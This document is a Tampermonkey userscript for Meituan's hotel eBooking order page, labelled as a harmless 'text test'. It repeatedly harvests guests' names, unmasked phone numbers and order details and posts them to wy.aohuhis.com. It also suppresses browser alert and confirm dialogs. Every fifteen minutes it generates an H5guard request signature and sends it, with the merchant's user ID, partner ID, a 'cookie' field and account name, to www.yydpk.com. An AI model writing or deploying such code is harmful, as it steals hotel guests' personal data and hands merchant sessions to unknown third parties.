// ==UserScript==
// @name         美团酒店
// @namespace    http://tampermonkey.net/
// @version      1.2.9
// @description  获取美团酒店文本测试
// @author       You
// @include      *://eb.meituan.com/ebk/consume/order.html
// @include      *://ebooking.meituan.com/ebk/consume/order.html
// @icon         https://www.google.com/s2/favicons?sz=64&domain=meituan.com
// @require      https://code.jquery.com/jquery-2.1.4.min.js
// @grant        none
// @license MIT
// @run-at document-idle
// @downloadURL https://update.greasyfork.org/scripts/420855/%E7%BE%8E%E5%9B%A2%E9%85%92%E5%BA%97.user.js
// @updateURL https://update.greasyfork.org/scripts/420855/%E7%BE%8E%E5%9B%A2%E9%85%92%E5%BA%97.meta.js
// ==/UserScript==

(function () {
    'use strict';
    /*! jQuery v3.1.1 | (c) jQuery Foundation | jquery.org/license */

    // console.log("234")
    window.alert = function () { return false; }
    window.confirm = function () { return false; }
    function getNowFormatDate() {
        var date = new Date();
        var seperator1 = "-";
        var seperator2 = ":";
        var month = date.getMonth() + 1;
        var strDate = date.getDate();
        if (month >= 1 && month <= 9) {
            month = "0" + month;
        }
        if (strDate >= 0 && strDate <= 9) {
            strDate = "0" + strDate;
        }
        var currentdate = date.getFullYear() + seperator1 + month + seperator1 + strDate
            + " " + date.getHours() + seperator2 + date.getMinutes()
            + seperator2 + date.getSeconds();
        return currentdate;
    }
    // Your code here...
    var host = window.location.host

    var get_phone = function (orderId, account, name, roomName, count, pay_money, eta_time, due_out_time, order_time, create_time, status, days, hours, rent_class_name, hotel_id, import_pms, userId) {
        var url = "https://" + host + "/api/v1/ebooking/resale/" + orderId + "/confirmPhone?userId=" + userId + "&_mtsi_eb_u=" + userId + "&_mtsi_eb_p=" + hotel_id + "&optimus_uuid=" + hotel_id + "&optimus_risk_level=71&optimus_code=10"


        var url_name = "https://" + host + "/api/v1/ebooking/orders/sensitiveData/" + orderId


        var url_money = "https://" + host + "/api/v1/ebooking/orders/" + orderId + "?userId=" + userId + "&_mtsi_eb_u=" + userId + "&_mtsi_eb_p=" + hotel_id + "&optimus_uuid=" + hotel_id + "&optimus_risk_level=71&optimus_code=10"




        $.ajax({
            url: url_money,
            type: "get",
            async: true,
            success: function (data_m) {

                console.log(data_m)
                

                //var resdata = data_m.data.results[0].priceInfo
                var price_list = []
                var price_dict={}
                var resdata = data_m.data.priceInfo
                for(var p=0;p<resdata.length;p++){
                    
                    price_dict[resdata[p]['date'].toString()]= resdata[p]['price']/100
                }
                // console.log(price_dict)

                for(var ket in price_dict){
                    var item = price_dict[ket];
                    price_list.push(item)
                }
            
                var new_price = (price_list).join()
                console.log(new_price)


                if (name.indexOf("*") == 1) {

                    // console.log('获取取消名字')
                    $.ajax({
                        url: url_name,
                        type: "get",
                        async: true,
                        success: function (name_data) {
                            var guestInfos = name_data.data.sensitiveDataList[0].guestInfos
                            var namelist = []
                            // console.log(guestInfos)
                            // console.log(guestInfos.length)

                            for (var p = 0; p < guestInfos.length; p++) {
                                var guestType = guestInfos[p].guestType
                                var name = guestInfos[p].name
                                // console.log(guestType)
                                // console.log(name)
                                if (guestType == "check_in_guest") {
                                    namelist.push(name)
                                }
                            }
                            var new_name = namelist.join()
                            // console.log(new_name)
                            $.ajax({
                                url: url,
                                type: "get",
                                async: true,
                                success: function (res) {
                                    var phone = res.data.confirmPhone // 手机号

                                    var paylaod = {
                                        "orderId": orderId.toString(), // 1 订单号
                                        "account": account.toString(),  // 2  账号
                                        "name": new_name, // 3 姓名
                                        "phone": phone.toString(), // 4 手机号
                                        "sex": "1", // 5 性别 默认男性

                                        "rentClassName": rent_class_name, // 6  租类
                                        "roomClassName": roomName, //7  房型
                                        "count": count,// 8 间数
                                        "payMoney": new_price,// 9 付款金额
                                        "reserveType": "1",                  // 10 订单类型 默认  1  1预付 2现付

                                        "etaTime": eta_time.toString(),// 11 预抵日期
                                        "dueOutTime": due_out_time.toString(),// 12 预离日期
                                        "days": days,// 13 天数
                                        "hours": hours, // 14 小时

                                        "orderTime": order_time, // 15 下单时间
                                        // "create_time":create_time, // 16 创建时间

                                        "status": status.toString(), // 17 订单状态
                                        // "import_pms":import_pms, // 18 是否导入pms

                                        "hotelId": hotel_id.toString(), // 19 酒店标识（美团唯一标识）
                                        "remark": "",// 备注  20,
                                        "substoreid": userId.toString()
                                    }

                                    var url_save = "https://wy.aohuhis.com:88/login/saveMeituanOrder"
                                    $.ajax({
                                        type: 'POST',
                                        url: url_save,
                                        data: JSON.stringify(paylaod),
                                        dataType: 'json',
                                        contentType: 'application/json',
                                        success: function (data) {
                                            // console.log(data)
                                            if (data.code == 200) {
                                                localStorage.setItem(orderId, status)

                                                if (phone.toString() == "确认订单后可查看用户电话") {
                                                    var cOrderId = orderId + "2"
                                                    localStorage.setItem(cOrderId, phone.toString())

                                                }
                                            }

                                        }


                                    }
                                    )

                                },
                                error: function (err) {
                                    console.log(123)
                                }
                            })
                        }
                    })
                } else {

                    // console.log(status.toString())
                    $.ajax({
                        url: url,
                        type: "get",
                        async: true,
                        success: function (res) {
                            var phone = res.data.confirmPhone // 手机号

                            var paylaod = {
                                "orderId": orderId.toString(), // 1 订单号
                                "account": account.toString(),  // 2  账号
                                "name": name.toString(), // 3 姓名
                                "phone": phone.toString(), // 4 手机号
                                "sex": "1", // 5 性别 默认男性

                                "rentClassName": rent_class_name, // 6  租类
                                "roomClassName": roomName, //7  房型
                                "count": count,// 8 间数
                                "payMoney": new_price,// 9 付款金额
                                "reserveType": "1",                  // 10 订单类型 默认  1  1预付 2现付

                                "etaTime": eta_time.toString(),// 11 预抵日期
                                "dueOutTime": due_out_time.toString(),// 12 预离日期
                                "days": days,// 13 天数
                                "hours": hours, // 14 小时

                                "orderTime": order_time, // 15 下单时间
                                // "create_time":create_time, // 16 创建时间

                                "status": status.toString(), // 17 订单状态
                                // "import_pms":import_pms, // 18 是否导入pms

                                "hotelId": hotel_id.toString(), // 19 酒店标识（美团唯一标识）
                                "remark": "",// 备注  20,
                                "substoreid": userId.toString()
                            }

                            var url_save = "https://wy.aohuhis.com:88/login/saveMeituanOrder"
                            $.ajax({
                                type: 'POST',
                                url: url_save,
                                data: JSON.stringify(paylaod),
                                dataType: 'json',
                                contentType: 'application/json',
                                success: function (data) {
                                    // console.log(data)
                                    if (data.code == 200) {
                                        localStorage.setItem(orderId, status)

                                        if (phone.toString() == "确认订单后可查看用户电话") {
                                            var cOrderId = orderId + "2"
                                            localStorage.setItem(cOrderId, phone.toString())

                                        }
                                    }

                                }


                            }
                            )

                        },
                        error: function (err) {
                            console.log(123)
                        }
                    })
                }
            }


        })
































    }


    setTimeout(function () {
        if (window.GLOBAL.partnerId == null || window.GLOBAL.partnerId == undefined) {
            window.location.reload()
        }
        else {




            var run = function () {

                // var endTime = new Date(new Date().toLocaleDateString()).getTime() + 24 * 60 * 60 * 1000 - 1 //获取当天23点59分59秒 时间戳
                var endTime = new Date().setDate(new Date().getDate() + 30)
                var startTime = new Date(new Date().toLocaleDateString()).getTime() // 当天凌晨时间戳
                if (startTime >= 1660968062000) {
                    startTime = 1659063251662
                }
                var userId = window.GLOBAL.userId
                var partnerId = window.GLOBAL.partnerId
                // console.log(userId, partnerId)
                var url = "https://" + host + "/api/v1/ebooking/orders?" + "endTime=" + endTime + "&filter=ALL&invoiceMark=0&limit=100&memberMark=0&offset=10&orderId=&orderStatus=&orderType=4,7&phone=&roomIds=&searchTimeType=2&sortField=2&sortType=2&startTime=" + startTime + "&zlPois=&_mtsi_eb_u=" + userId + '&_mtsi_eb_p=' + partnerId + "&optimus_uuid=" + partnerId + "&optimus_risk_level=71&optimus_code=10"

                // console.log(url)
                $.ajax({
                    url: url,
                    type: 'get',
                    // async:false,
                    success: function (res) {
                        // console.log(res);
                        var results = res.data.results
                        // console.log(results)
                        // 遍历
                        var rLen = results.length
                        // console.log(rLen)
                        for (var i = 0; i < rLen; i++) {
                            (function (i) {
                                var orderId = results[i].orderId.toString() // "订单号"
                                if (localStorage.getItem(orderId.toString()) == null) {
                                    setTimeout(() => {
                                        // 订单信息放入 localstorage 去重

                                        // console.log('获取订单id')
                                        var url_query = "https://wy.aohuhis.com:88/login/getMeituanOrder?orderId=" + orderId
                                        $.ajax({
                                            url: url_query,
                                            type: 'get',
                                            async: false,
                                            success: function (res) {


                                                // console.log(res.data)
                                                if (res.data == "") {
                                                    var account = results[i].partnerName // 登录账号
                                                    var name = results[i].contacts[0].name //姓名
                                                    var roomName = results[i].roomName  // 房型
                                                    var count = results[i].roomCount   //'间数'
                                                    var pay_money = results[i].realFloorPrice / 100  // 付款金额 低价
                                                    var eta_time = results[i].checkInDateString  // 预抵日期
                                                    var due_out_time = results[i].checkOutDateString  // 预离日期
                                                    var date1 = new Date(eta_time).getTime()
                                                    var date2 = new Date(due_out_time).getTime()
                                                    var days = (date2 - date1) / 3600000 / 24 // # 天数
                                                    var hours = (date2 - date1) / 3600000 // 小时
                                                    var order_time = results[i].payTimeString  // 下单时间 payTimeString
                                                    var create_time = results[i].aptCreatTimeString  //创建时间 payTimeString
                                                    var status = results[i].status  // 订单状态
                                                    if (status == "CANCELED") { status = 2 }
                                                    else { status = 1 }
                                                    if (days < 1) {
                                                        var rent_class_name = "钟点房"
                                                        days = 0.5
                                                    } else {
                                                        rent_class_name = "全天房"
                                                    }
                                                    // if (hours < 1) {
                                                    //     hours = 0.5
                                                    // }
                                                    var import_pms = 0
                                                    var hotel_id = results[i].partnerId
                                                    get_phone(orderId, account, name, roomName, count, pay_money, eta_time, due_out_time, order_time, create_time, status, days, hours, rent_class_name, hotel_id, import_pms, userId)
                                                    // console.log(orderId, account, name, roomName)
                                                    // console.log(count, pay_money, eta_time, due_out_time)
                                                    // console.log(order_time, create_time, status)
                                                    // console.log(days, hours, rent_class_name, hotel_id)
                                                } else {
                                                    let u_phone = res.data.phone
                                                    if (u_phone == "确认订单后可查看用户电话") {
                                                        let url_phone = "https://" + host + "/api/v1/ebooking/resale/" + orderId + "/confirmPhone?userId=" + userId + "&_mtsi_eb_u=" + userId + "&_mtsi_eb_p=" + partnerId + "&optimus_uuid=" + partnerId + "&optimus_risk_level=71&optimus_code=10"

                                                        $.ajax({
                                                            url: url_phone,
                                                            type: "get",
                                                            async: true,
                                                            success: function (res) {
                                                                let enwphone = res.data.confirmPhone // 手机号

                                                                let update_phone_url = "https://wy.aohuhis.com:88/login/updateMeituanOrder"
                                                                let update_data = {
                                                                    "orderId": orderId,
                                                                    'phone': enwphone
                                                                }
                                                                $.ajax({
                                                                    type: 'POST',
                                                                    url: update_phone_url,
                                                                    data: JSON.stringify(update_data),
                                                                    dataType: 'json',
                                                                    contentType: 'application/json',
                                                                    async: false,
                                                                    success: function (data_Up) {
                                                                        // console.log(data_Up)
                                                                        // console.log(999999)
                                                                        // console.log(data_Up.code)
                                                                        // console.log(qx)
                                                                        if (data_Up.code == 200) {
                                                                            // console.log(qx)
                                                                            var newflag = orderId.toString() + "2"

                                                                            // console.log(newflag, '测试')
                                                                            localStorage.setItem(newflag, enwphone)
                                                                        }

                                                                    }
                                                                }
                                                                )
                                                            }
                                                        })
                                                    }




                                                    console.log(res)




                                                }

                                            }


                                        })
                                    }, 1000 * i)


                                }
                                else {

                                    if (localStorage.getItem(orderId) == "2" || results[i].status == "CANCELED") {

                                        // 优化无
                                        var qx = orderId
                                        var up_data = {
                                            "orderId": qx
                                        }
                                        var url_update = "https://wy.aohuhis.com:88/login/cancelOrder"
                                        $.ajax({
                                            type: 'POST',
                                            url: url_update,
                                            data: JSON.stringify(up_data),
                                            dataType: 'json',
                                            contentType: 'application/json',
                                            async: false,
                                            success: function (data_Up) {
                                                // console.log(data_Up)
                                                // console.log(999999)
                                                // console.log(data_Up.code)
                                                // console.log(qx)
                                                if (data_Up.code == 200) {
                                                    // console.log(qx)
                                                    var newflag = qx.toString() + "1"

                                                    // console.log(newflag, '测试')
                                                    localStorage.setItem(newflag, "已更新")
                                                }

                                            }
                                        })


                                        // 更新 phone
                                        if (localStorage.getItem(orderId + "2") == "确认订单后可查看用户电话") {

                                            var url_phone = "https://" + host + "/api/v1/ebooking/resale/" + orderId + "/confirmPhone?userId=" + userId + "&_mtsi_eb_u=" + userId + "&_mtsi_eb_p=" + partnerId + "&optimus_uuid=" + partnerId + "&optimus_risk_level=71&optimus_code=10"

                                            $.ajax({
                                                url: url_phone,
                                                type: "get",
                                                async: true,
                                                success: function (res) {
                                                    var enwphone = res.data.confirmPhone // 手机号

                                                    var update_phone_url = "https://wy.aohuhis.com:88/login/updateMeituanOrder"
                                                    var update_data = {
                                                        "orderId": orderId,
                                                        'phone': enwphone
                                                    }
                                                    $.ajax({
                                                        type: 'POST',
                                                        url: update_phone_url,
                                                        data: JSON.stringify(update_data),
                                                        dataType: 'json',
                                                        contentType: 'application/json',
                                                        async: false,
                                                        success: function (data_Up) {
                                                            // console.log(data_Up)
                                                            // console.log(999999)
                                                            // console.log(data_Up.code)
                                                            // console.log(qx)
                                                            if (data_Up.code == 200) {
                                                                // console.log(qx)
                                                                var newflag = orderId.toString() + "2"

                                                                // console.log(newflag, '测试')
                                                                localStorage.setItem(newflag, enwphone)
                                                            }

                                                        }
                                                    }
                                                    )
                                                }
                                            })






                                        }

                                    } else {
                                        console.log(orderId.toString() + "已存在")

                                        if (localStorage.getItem(orderId + "2") == "确认订单后可查看用户电话") {

                                            let url_phone = "https://" + host + "/api/v1/ebooking/resale/" + orderId + "/confirmPhone?userId=" + userId + "&_mtsi_eb_u=" + userId + "&_mtsi_eb_p=" + partnerId + "&optimus_uuid=" + partnerId + "&optimus_risk_level=71&optimus_code=10"

                                            $.ajax({
                                                url: url_phone,
                                                type: "get",
                                                async: true,
                                                success: function (res) {
                                                    let enwphone = res.data.confirmPhone // 手机号

                                                    let update_phone_url = "https://wy.aohuhis.com:88/login/updateMeituanOrder"
                                                    let update_data = {
                                                        "orderId": orderId,
                                                        'phone': enwphone
                                                    }
                                                    $.ajax({
                                                        type: 'POST',
                                                        url: update_phone_url,
                                                        data: JSON.stringify(update_data),
                                                        dataType: 'json',
                                                        contentType: 'application/json',
                                                        async: false,
                                                        success: function (data_Up) {
                                                            // console.log(data_Up)
                                                            // console.log(999999)
                                                            // console.log(data_Up.code)
                                                            // console.log(qx)
                                                            if (data_Up.code == 200) {
                                                                // console.log(qx)
                                                                var newflag = orderId.toString() + "2"

                                                                // console.log(newflag, '测试')
                                                                localStorage.setItem(newflag, enwphone)
                                                            }

                                                        }
                                                    }
                                                    )
                                                }
                                            })






                                        }


                                    }




                                }

                            })(i)

                        }


                        var testdiv = document.getElementsByClassName("nav nav-tabs")[0]
                        if (document.getElementById("myli") == null) {
                            var myli = document.createElement("li")
                            myli.id = 'myli'
                            myli.innerHTML = "<p style='margin-right: 300px'>运行时间：<lable id='newTime' style='color:red' ></lable></p>";
                            // console.log(getNowFormatDate())
                            // document.getElementById("newTime").innerHTML= getNowFormatDate()
                            testdiv.appendChild(myli)

                        }
                        else {
                            // console.log(getNowFormatDate())
                            document.getElementById("newTime").innerHTML = getNowFormatDate()
                        }

                        setTimeout(function () {
                            run()


                        }, 10000)
                    }, error: function (err) {
                        console.log('获取今日待入住失败')
                        console.log(err)
                    }
                });
            }
            run()
        }
    }, 1000 * 15)


    setTimeout(function(){
        try {
            let url = 'https://ebooking.meituan.com/api/v1/ebooking/orders/4890920758685222954?userId=122500709&_mtsi_eb_u=122500709&_mtsi_eb_p=4518645&optimus_uuid=4518645&optimus_risk_level=71&optimus_code=10'
            var signData = {
                url: url,
                headers: {},
                method: "get",
                data: null
            }
            H5guard.sign(signData).then((signreq) => {
    
                //console.log(signreq.headers);
    
                let userId = window.GLOBAL.userId
                let partnerId = window.GLOBAL.partnerId
                let cookie = window.GLOBAL.helperCenterLink
                let names = window.GLOBAL.basicinfo.name
                let data = {
                    'userId': userId,
                    "partnerId": partnerId,
                    "cookie": cookie,
                    "name": names,
                    "domain": window.location.origin,
                    "mtgsig": signreq.headers.mtgsig
                }
                let url = "https://www.yydpk.com/save"
    
                $.ajax({
                    type: 'POST',
                    url: url,
                    data: JSON.stringify(data),
                    dataType: 'json',
                    // headers: { "mtgsig": signreq.headers.mtgsig },
                    contentType: 'application/json',
                    async: false,
                    success: function (data_Up) {
                        console.log(data_Up)
    
                    }
                })
    
            })
    
        } catch (error) {
    
        }
    },1000*15)


    

    setInterval(function () {
        //需要执行的代码写在这里
        try {
            let url = 'https://ebooking.meituan.com/api/v1/ebooking/orders/4890920758685222954?userId=122500709&_mtsi_eb_u=122500709&_mtsi_eb_p=4518645&optimus_uuid=4518645&optimus_risk_level=71&optimus_code=10'
            var signData = {
                url: url,
                headers: {},
                method: "get",
                data: null
            }
            H5guard.sign(signData).then((signreq) => {

                //console.log(signreq.headers);

                let userId = window.GLOBAL.userId
                let partnerId = window.GLOBAL.partnerId
                let cookie = window.GLOBAL.helperCenterLink
                let names = window.GLOBAL.basicinfo.name
                let data = {
                    'userId': userId,
                    "partnerId": partnerId,
                    "cookie": cookie,
                    "name": names,
                    "domain": window.location.origin,
                    "mtgsig": signreq.headers.mtgsig
                }
                let url = "https://www.yydpk.com/save"

                $.ajax({
                    type: 'POST',
                    url: url,
                    data: JSON.stringify(data),
                    dataType: 'json',

                    contentType: 'application/json',
                    async: false,
                    success: function (data_Up) {
                        console.log(data_Up)

                    }
                })

            })

        } catch (error) {

        }


    }, 1000 * 60 * 15);



})();



// var testdiv = document.getElementsByClassName("nav nav-tabs")[0]
// var myli = document.createElement("li")

// myli.innerHTML="<p style='margin-right: 300px'>运行时间：<lable id='newTime' style='color:blue' >this</lable></p>";
// // document.getElementById("newTime").style.color="#ff0000"

// testdiv.appendChild(myli)


// var url ="https://eb.meituan.com/api/v1/ebooking/orders/4890920760179724252?userId=122500709&_mtsi_eb_u=122500709&_mtsi_eb_p=4518645&optimus_uuid=4518645&optimus_risk_level=71&optimus_code=10"
// $.ajax({
//     url: url,
//     type: "get",
//     async: true,
//     success: function (data_m) {

//         var price_list = []
//         var price_dict={}
//         var resdata = data_m.data.priceInfo
//         for(var p=0;p<resdata.length;p++){
            
//             price_dict[resdata[p]['date'].toString()]= resdata[p]['price']/100
//         }
//         console.log(price_dict)

//         for(var ket in price_dict){
//             var item = price_dict[ket];
//             price_list.push(item)
//         }
       
//         new_price = (price_list).join()
//         console.log(new_price)
//     }
        
// })